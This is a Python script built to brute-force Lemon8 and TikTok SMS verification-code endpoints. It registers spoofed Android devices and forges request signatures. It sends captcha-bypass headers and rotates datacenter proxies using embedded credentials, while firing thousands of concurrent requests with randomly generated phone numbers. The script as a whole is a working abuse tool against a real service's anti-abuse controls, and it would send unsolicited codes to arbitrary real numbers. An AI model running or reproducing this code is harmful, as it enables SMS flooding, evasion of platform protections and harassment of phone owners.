#!/usr/bin/env python3
"""
Lemon8 Multi-Version Brute Force
=================================
Goal: Achieve at least ONE SUCCESS on Lemon8 endpoints.

Strategy:
- Test newly-discovered Lemon8-DEDICATED hosts from APKs (8 versions analyzed):
    lemonapi16-normal-alisg.tiktokv.com, lemonapi16-normal-no1a.tiktokv.eu,
    lemonapi16-normal-useast5.tiktokv.us, lemonapi16-normal-useast8.tiktokv.us,
    lemonapi16-normal-useastred.tiktokv.eu, web.lemon8-app.com,
    s.lemon8-app.com, v.lemon8-app.com
- Use 35+ AIDs (all known + 4370 Lemon8 official + Lemon8-relevant)
- Use Lemon8 popular regions (BD/JP/MY/TH/ID/SG/TW + classic AU/DE/FR/US/GB)
- Both signed mobile + unsigned web endpoints
- High concurrency (300 workers)
"""

import asyncio
import aiohttp
import json
import random
import time
import hashlib
import uuid
import sys
from urllib.parse import urlencode
from dataclasses import dataclass, field
from typing import Dict, List

PROXY_TEMPLATE = "http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080"
# Mix: Lemon8-popular regions + classic ByteDance regions
REGIONS = ["JP", "SG", "US", "AU", "DE", "GB", "FR", "NL", "CA", "TH", "ID", "MY", "TW", "VN", "PH"]
TIMEOUT = aiohttp.ClientTimeout(total=15)

try:
    import SignerPy as SP
    SIGNER_OK = True
except ImportError:
    SIGNER_OK = False
    print("WARNING: SignerPy not available - signed will use weak fallback")


def gen_phone():
    # Lemon8-popular phone prefixes (Japan, Thailand, Indo, Malaysia, Phil, Sing, US)
    prefixes = [
        ("+81", 10),  # Japan
        ("+66", 9),   # Thailand
        ("+62", 11),  # Indonesia
        ("+60", 9),   # Malaysia
        ("+63", 10),  # Philippines
        ("+65", 8),   # Singapore
        ("+1", 10),   # US/Canada
        ("+44", 10),  # UK
        ("+61", 9),   # Australia
        ("+886", 9),  # Taiwan
        ("+84", 9),   # Vietnam
        ("+49", 10),  # Germany
        ("+33", 9),   # France
    ]
    prefix, digits = random.choice(prefixes)
    num = ''.join(str(random.randint(1 if i == 0 else 0, 9)) for i in range(digits))
    return f"{prefix}{num}"


def encrypt_phone(phone):
    return ''.join(format(ord(c) ^ 5, '02x') for c in phone)


def get_proxy(region=None):
    return PROXY_TEMPLATE.format(region=region or random.choice(REGIONS))


@dataclass
class Stats:
    total: int = 0
    success: int = 0
    rate_limited: int = 0
    no_perms: int = 0
    errors: int = 0
    html: int = 0
    not_found: int = 0
    email_format: int = 0
    other: int = 0
    findings: List[Dict] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock, repr=False)

    async def record(self, cat, detail=None):
        async with self._lock:
            self.total += 1
            setattr(self, cat, getattr(self, cat, 0) + 1)
            if detail and cat in ("success", "rate_limited", "email_format"):
                self.findings.append(detail)

    def summary(self):
        elapsed = time.time() - self.start_time
        rps = self.total / elapsed if elapsed > 0 else 0
        return (f"total={self.total} suc={self.success} rl={self.rate_limited} "
                f"ec16={self.no_perms} 404={self.not_found} email={self.email_format} "
                f"err={self.errors} html={self.html} other={self.other} "
                f"time={elapsed:.0f}s rps={rps:.1f}")


stats = Stats()

# ============================================
# NEW LEMON8-DEDICATED HOSTS (from multi-version APK RE)
# ============================================
LEMON8_DEDICATED = [
    "lemonapi16-normal-alisg.tiktokv.com",         # Singapore alibaba
    "lemonapi16-normal-no1a.tiktokv.eu",           # Norway 1a (.eu TLD!)
    "lemonapi16-normal-useast5.tiktokv.us",        # US East 5
    "lemonapi16-normal-useast8.tiktokv.us",        # US East 8
    "lemonapi16-normal-useastred.tiktokv.eu",      # US East Red (.eu TLD!)
    "lemon8-api.tiktokv.com",                      # Already known (RL only)
]

# Lemon8 own domain
LEMON8_WEB_HOSTS = [
    "web.lemon8-app.com",
    "www.lemon8-app.com",
    "s.lemon8-app.com",
    "v.lemon8-app.com",
    "api.lemon8-app.com",
]

# Ali Singapore + EU + US TLDs (since Lemon8 hosts use these)
EXTRA_HOSTS = [
    "api16-normal-c-alisg.tiktokv.com",
    "api16-normal-useast5.tiktokv.us",
    "api16-normal-useast8.tiktokv.us",
    "api77-normal-c-alisg.tiktokv.com",
    "api77-normal-c-useast1a.tiktokv.com",
    "api22-normal-c-alisg.tiktokv.com",
    "api31-normal-alisg.tiktokv.com",
    "api32-normal-alisg.tiktokv.com",
]

# ============================================
# AIDS (35+ candidates including Lemon8 official 4370)
# ============================================
AIDS = {
    # Lemon8-specific candidates (HIGHEST PRIORITY)
    4370: ("Lemon8 Official", "nproject", "com.bd.nproject"),
    2658: ("BD2658/Lemon8", "musical_ly", "com.zhiliaoapp.musically"),
    # Discovered from previous runs (signed-mobile working)
    2239: ("BD 2239", "musical_ly", "com.zhiliaoapp.musically"),
    1583: ("TikTok Ads", "tiktok_web", "tiktok_web"),
    7743: ("BD 7743", "musical_ly", "com.zhiliaoapp.musically"),
    1760: ("BD 1760", "musical_ly", "com.zhiliaoapp.musically"),
    6027: ("BD 6027", "musical_ly", "com.zhiliaoapp.musically"),
    4143: ("BD 4143", "musical_ly", "com.zhiliaoapp.musically"),
    6849: ("BD 6849", "musical_ly", "com.zhiliaoapp.musically"),
    1988: ("Douyin Web", "douyin_web", "douyin_web"),
    # APK extracted
    473824: ("BD 473824", "musical_ly", "com.zhiliaoapp.musically"),
    567753: ("BD 567753", "musical_ly", "com.zhiliaoapp.musically"),
    # TikTok ecosystem
    1233: ("TikTok Global", "musical_ly", "com.zhiliaoapp.musically"),
    1340: ("TikTok Lite", "trill", "com.zhiliaoapp.musically.go"),
    3006: ("CapCut", "vicut", "com.lemon.lvoverseas"),
    1180: ("Helo", "musical_ly", "com.zhiliaoapp.musically"),
    2657: ("BD 2657", "musical_ly", "com.zhiliaoapp.musically"),
    259: ("BD 259", "musical_ly", "com.zhiliaoapp.musically"),
    # Other
    1459: ("TikTok Web", "tiktok_web", "tiktok_web"),
    32: ("Xigua Video", "video_article", "com.ss.android.article.video"),
    13: ("Toutiao", "news_article", "com.ss.android.article.news"),
    1128: ("Douyin", "aweme", "com.ss.android.ugc.aweme"),
    1112: ("Huoshan", "live_stream", "com.ss.android.ugc.live"),
    1319: ("Pipix", "super", "com.sup.android.superb"),
    2329: ("Douyin Lite", "aweme_lite", "com.ss.android.ugc.aweme.lite"),
    2960: ("BD 2960", "musical_ly", "com.zhiliaoapp.musically"),
    4068: ("BD 4068", "musical_ly", "com.zhiliaoapp.musically"),
    4174: ("BD 4174", "musical_ly", "com.zhiliaoapp.musically"),
    5049: ("BD 5049", "musical_ly", "com.zhiliaoapp.musically"),
    6556: ("BD 6556", "musical_ly", "com.zhiliaoapp.musically"),
    8311: ("BD 8311", "musical_ly", "com.zhiliaoapp.musically"),
    # New Lemon8 candidates - try variations
    3569: ("Volcengine 3569", "volcengine", "com.volcengine"),
    3559: ("Volcengine 3559", "volcengine", "com.volcengine"),
}

ENDPOINTS_SIGNED = [
    "/passport/mobile/send_code/v1/",
    "/passport/mobile/send_code/",
    "/passport/mobile/send_code/v2/",
    "/passport/mobile/can_send_voice_code/",
]

ENDPOINTS_WEB = [
    "/passport/web/send_code/",
    "/passport/email/send_code/",
    "/passport/mobile/send_code/v1/",
]

TYPE_CODES = [3635, 3532, 3637, 3634, 3734, 3733, 3731, 3536, 3132, 3631, 3632, 34]

BRANDS = {
    "samsung": ["SM-S918B", "SM-S911B", "SM-A546B"],
    "Google": ["Pixel 8 Pro", "Pixel 7"],
    "OnePlus": ["IN2020", "NE2210"],
    "Xiaomi": ["2201117TG", "23078RKD5C"],
}
ANDROIDS = ["12", "13", "14"]
API_LEVELS = {"12": "31", "13": "33", "14": "34"}
BUILD_IDS = ["UP1A.231005.007", "TP1A.220624.014", "TQ3A.230705.001"]


def gen_device():
    brand = random.choice(list(BRANDS.keys()))
    model = random.choice(BRANDS[brand])
    av = random.choice(ANDROIDS)
    return {
        "brand": brand, "model": model, "android_version": av,
        "api_level": API_LEVELS[av], "build_id": random.choice(BUILD_IDS),
        "resolution": random.choice(["1080*2400", "1080*2340"]),
        "dpi": "440", "openudid": uuid.uuid4().hex[:16],
        "cdid": str(uuid.uuid4()),
        "odin_tt": hashlib.sha256(uuid.uuid4().bytes).hexdigest(),
    }


async def register_device(session, domain, aid, app_name, package, proxy=None):
    dev = gen_device()
    ts = int(time.time())
    vc = "350804"
    vn = "35.8.4"
    params = urlencode({
        "aid": str(aid), "app_name": app_name, "version_code": vc, "version_name": vn,
        "device_platform": "android", "os": "android",
        "os_api": dev["api_level"], "os_version": dev["android_version"],
        "device_type": dev["model"], "device_brand": dev["brand"],
        "language": "en", "ac": "wifi", "channel": "googleplay",
        "resolution": dev["resolution"], "dpi": dev["dpi"],
        "openudid": dev["openudid"], "cdid": dev["cdid"],
        "ts": str(ts), "_rticket": str(ts * 1000),
    })
    body = json.dumps({
        "magic_tag": "ss_app_log",
        "header": {
            "display_name": app_name, "update_version_code": int(vc),
            "manifest_version_code": int(vc), "aid": aid, "channel": "googleplay",
            "package": package, "app_version": vn, "version_code": int(vc),
            "sdk_version": "2.14.0-rc.8", "os": "Android",
            "os_version": dev["android_version"], "os_api": int(dev["api_level"]),
            "device_model": dev["model"], "device_brand": dev["brand"],
            "device_manufacturer": dev["brand"], "cpu_abi": "arm64-v8a",
            "density_dpi": int(dev["dpi"]), "display_density": "xxhdpi",
            "resolution": dev["resolution"].replace("*", "x"),
            "language": "en", "timezone": 0, "access": "wifi",
            "cdid": dev["cdid"], "sig_hash": "aea615ab", "openudid": dev["openudid"],
            "clientudid": str(uuid.uuid4()), "region": random.choice(["US","JP","SG","TH","ID","MY"]),
        },
        "_gen_ts": ts,
    })
    url = f"https://{domain}/service/2/device_register/?{params}"
    ua = f"{package}/{vc} (Linux; U; Android {dev['android_version']}; en_US; {dev['model']}; Build/{dev['build_id']})"
    try:
        async with session.post(url, data=body,
                                headers={"Host": domain, "User-Agent": ua, "Content-Type": "application/json"},
                                proxy=proxy, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status == 200:
                data = await resp.json()
                return {"device_id": str(data.get("device_id", "")),
                        "iid": str(data.get("install_id", "")), "dev": dev}
    except Exception:
        pass
    return None


def sign_req(url_params, body, cookie_str, aid):
    if SIGNER_OK:
        return SP.sign(params=url_params, payload=body, cookie=cookie_str, version=8404, aid=aid)
    ts = str(int(time.time()))
    return {"x-gorgon": hashlib.md5(f"{url_params}{ts}".encode()).hexdigest()[:20] + "00000000",
            "x-khronos": ts, "x-argus": "", "x-ladon": "",
            "x-ss-stub": hashlib.md5(body.encode()).hexdigest().upper()}


async def _classify(data, detail):
    msg = data.get("message", "")
    ec = data.get("data", {}).get("error_code", data.get("error_code", -1))
    if msg == "success":
        detail["type"] = "SUCCESS"
        await stats.record("success", detail)
        print(f"\n*** SUCCESS *** AID={detail['aid']} dom={detail['domain']} ep={detail['endpoint']} tc={detail['tc']} method={detail.get('method')}")
    elif ec in (7, 1206):
        detail["type"] = "RATE_LIMITED"
        await stats.record("rate_limited", detail)
    elif ec == 16:
        await stats.record("no_perms")
    elif ec == 1031:
        detail["type"] = "EMAIL_FORMAT"
        await stats.record("email_format", detail)
    else:
        await stats.record("other")


async def test_web(session, sem, domain, endpoint, aid, tc, app_name, proxy):
    async with sem:
        phone = gen_phone()
        body = urlencode({"mobile": encrypt_phone(phone), "type": str(tc), "aid": str(aid),
                          "app_name": app_name, "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0"})
        url = f"https://{domain}{endpoint}?aid={aid}&app_name={app_name}"
        headers = {"Host": domain, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
                   "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json",
                   "Origin": f"https://{domain}", "X-SS-DP": str(aid),
                   "x-tt-bypass-bdturing": "1", "x-tt-cmpl-token": "", "x-tt-cipher-version": "1"}
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False, timeout=TIMEOUT) as resp:
                if resp.status == 404: await stats.record("not_found"); return
                text = await resp.text()
                if not text.strip().startswith("{"): await stats.record("html"); return
                await _classify(json.loads(text), {"aid": aid, "domain": domain, "tc": tc,
                    "app_name": app_name, "endpoint": endpoint, "method": "web", "phone": phone})
        except Exception:
            await stats.record("errors")


async def test_signed(session, sem, domain, endpoint, aid, tc, app_name, package, proxy, reg_domain=None):
    async with sem:
        phone = gen_phone()
        encrypted = encrypt_phone(phone)
        ts = int(time.time())
        rticket = str(ts * 1000 + random.randint(1000, 9999))
        # Use a known-good registration host
        rd = reg_domain or "api16-normal-c-useast2a.tiktokv.com"
        dev_info = await register_device(session, rd, aid, app_name, package, proxy)
        if not dev_info:
            dev_info = {"device_id": str(random.randint(10**15, 10**16-1)),
                        "iid": str(random.randint(10**15, 10**16-1)), "dev": gen_device()}
        dev = dev_info["dev"]
        vc = "350804"
        body = urlencode({"mobile": encrypted, "type": str(tc), "aid": str(aid), "app_name": app_name,
                          "auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35", "mix_mode": "1",
                          "is6Digits": "1", "check_register": "1", "multi_login": "1"})
        url_params = urlencode({"aid": str(aid), "app_name": app_name, "version_code": vc,
                                "device_id": dev_info["device_id"], "iid": dev_info["iid"],
                                "device_platform": "android", "os_version": dev["android_version"],
                                "device_type": dev["model"], "device_brand": dev["brand"],
                                "language": "en", "ac": "wifi", "channel": "googleplay",
                                "openudid": dev["openudid"], "cdid": dev["cdid"],
                                "ts": str(ts), "_rticket": rticket})
        cookie = f"sessionid=; install_id={dev_info['iid']}; store-country-code={random.choice(['us','jp','sg','th','id','my','tw'])}; odin_tt={dev['odin_tt']}"
        sigs = sign_req(url_params, body, cookie, aid)
        ua = f"{package}/{vc} (Linux; U; Android {dev['android_version']}; en_US; {dev['model']}; Build/{dev['build_id']})"
        headers = {"Host": domain, "Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "X-SS-DP": str(aid), "User-Agent": ua, "Accept-Encoding": "gzip, deflate",
                   "x-tt-bypass-dp": "1", "x-tt-dm-status": "login=0;ct=0;rt=7",
                   "x-tt-store-region": random.choice(["jp","sg","us","th","id","my","tw","au","de","gb"]),
                   "x-tt-store-region-src": "did", "x-tt-bypass-bdturing": "1",
                   "x-tt-cmpl-token": "", "x-tt-cipher-version": "1",
                   "x-tt-app-init-region": random.choice(["JP","SG","US","TH","ID","MY","TW","AU","DE"]),
                   "X-Gorgon": sigs.get("x-gorgon", ""), "X-Khronos": sigs.get("x-khronos", str(ts)),
                   "X-Argus": sigs.get("x-argus", ""), "X-Ladon": sigs.get("x-ladon", ""),
                   "X-SS-STUB": sigs.get("x-ss-stub", "")}
        url = f"https://{domain}{endpoint}?{url_params}"
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False, timeout=TIMEOUT) as resp:
                if resp.status == 404: await stats.record("not_found"); return
                text = await resp.text()
                if not text.strip().startswith("{"): await stats.record("html"); return
                await _classify(json.loads(text), {"aid": aid, "domain": domain, "tc": tc,
                    "app_name": app_name, "endpoint": endpoint, "method": "signed", "phone": phone})
        except Exception:
            await stats.record("errors")


async def progress_loop():
    last = 0
    while True:
        await asyncio.sleep(20)
        s = stats.summary()
        print(f"  PROGRESS: {s}")
        if stats.total == last:
            print("    (no progress for 20s)")
        last = stats.total


async def run_phase(name, tasks_gen, max_workers=300, max_tasks=None):
    print(f"\n{'='*70}\n  PHASE: {name}\n{'='*70}")
    sem = asyncio.Semaphore(max_workers)
    tasks = []
    connector = aiohttp.TCPConnector(limit=max_workers, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for t in tasks_gen(session, sem):
            tasks.append(t)
            if max_tasks and len(tasks) >= max_tasks:
                break
        random.shuffle(tasks)
        prog_task = asyncio.create_task(progress_loop())
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            prog_task.cancel()
    print(f"  PHASE DONE: {stats.summary()}")


def gen_phase_a(session, sem):
    """Phase A: Lemon8-DEDICATED hosts × ALL AIDs × signed endpoints"""
    for host in LEMON8_DEDICATED:
        for aid, (name, app_name, package) in AIDS.items():
            for ep in ENDPOINTS_SIGNED:
                for tc in random.sample(TYPE_CODES, 4):
                    proxy = get_proxy()
                    yield test_signed(session, sem, host, ep, aid, tc, app_name, package, proxy)


def gen_phase_b(session, sem):
    """Phase B: Lemon8-WEB hosts × ALL AIDs × web endpoints (unsigned)"""
    for host in LEMON8_WEB_HOSTS:
        for aid, (name, app_name, package) in AIDS.items():
            for ep in ENDPOINTS_WEB:
                for tc in random.sample(TYPE_CODES, 4):
                    proxy = get_proxy()
                    yield test_web(session, sem, host, ep, aid, tc, app_name, proxy)


def gen_phase_c(session, sem):
    """Phase C: Lemon8-DEDICATED hosts × all AIDs × WEB unsigned (cross-attempt)"""
    for host in LEMON8_DEDICATED:
        for aid, (name, app_name, package) in AIDS.items():
            for ep in ENDPOINTS_WEB:
                for tc in random.sample(TYPE_CODES, 3):
                    proxy = get_proxy()
                    yield test_web(session, sem, host, ep, aid, tc, app_name, proxy)


def gen_phase_d(session, sem):
    """Phase D: AID 4370 LASER FOCUS (Lemon8 official AID) × all hosts × all combos"""
    aid = 4370
    name, app_name, package = AIDS[4370]
    all_hosts = LEMON8_DEDICATED + EXTRA_HOSTS
    for host in all_hosts:
        for ep in ENDPOINTS_SIGNED:
            for tc in TYPE_CODES:
                # multi-region
                for region in ["JP", "SG", "US", "AU", "TH", "ID"]:
                    proxy = get_proxy(region)
                    yield test_signed(session, sem, host, ep, aid, tc, app_name, package, proxy)


def gen_phase_e(session, sem):
    """Phase E: AID 2658 (Lemon8 BD2658) LASER FOCUS"""
    aid = 2658
    name, app_name, package = AIDS[2658]
    all_hosts = LEMON8_DEDICATED + EXTRA_HOSTS
    for host in all_hosts:
        for ep in ENDPOINTS_SIGNED:
            for tc in TYPE_CODES:
                for region in ["JP", "SG", "US", "AU", "TH"]:
                    proxy = get_proxy(region)
                    yield test_signed(session, sem, host, ep, aid, tc, app_name, package, proxy)


async def main():
    print("="*70)
    print("  LEMON8 MULTI-VERSION BRUTE FORCE")
    print(f"  AIDs: {len(AIDS)} | Lemon8 hosts: {len(LEMON8_DEDICATED)} | Web hosts: {len(LEMON8_WEB_HOSTS)}")
    print(f"  Endpoints: {len(ENDPOINTS_SIGNED)} signed + {len(ENDPOINTS_WEB)} web")
    print(f"  Type codes: {len(TYPE_CODES)} | Regions: {len(REGIONS)}")
    print("="*70)

    # Phase A: Lemon8 dedicated hosts × signed
    await run_phase("A: Lemon8 Dedicated × Signed", gen_phase_a, max_workers=200, max_tasks=4000)

    # Phase B: Lemon8 web hosts × web endpoints
    await run_phase("B: Lemon8 Web × Web Endpoints", gen_phase_b, max_workers=300, max_tasks=2000)

    # Phase C: cross-attempt web on dedicated mobile hosts
    await run_phase("C: Lemon8 Dedicated × Web Endpoints", gen_phase_c, max_workers=300, max_tasks=2000)

    # Phase D: AID 4370 laser focus
    await run_phase("D: AID 4370 (Lemon8 Official) Laser", gen_phase_d, max_workers=200, max_tasks=2500)

    # Phase E: AID 2658 laser focus
    await run_phase("E: AID 2658 (BD2658/Lemon8) Laser", gen_phase_e, max_workers=200, max_tasks=2500)

    # Save findings
    out = {
        "summary": stats.summary(),
        "successes": [f for f in stats.findings if f.get("type") == "SUCCESS"],
        "rate_limited": [f for f in stats.findings if f.get("type") == "RATE_LIMITED"],
        "email_format": [f for f in stats.findings if f.get("type") == "EMAIL_FORMAT"],
    }
    out_path = "/home/ubuntu/lemon8_versions/findings/bruteforce_results.json"
    with open(out_path, "w") as f:
        json.dump(out, f, indent=2)

    print(f"\n{'='*70}\nFINAL: {stats.summary()}")
    print(f"  SUCCESSES: {len(out['successes'])}")
    print(f"  RATE LIMITED: {len(out['rate_limited'])}")
    print(f"  EMAIL FORMAT: {len(out['email_format'])}")
    print(f"  Saved to: {out_path}")

    # Print first 20 successes
    if out["successes"]:
        print("\nFIRST SUCCESSES:")
        for s in out["successes"][:20]:
            print(f"  {s}")


if __name__ == "__main__":
    asyncio.run(main())
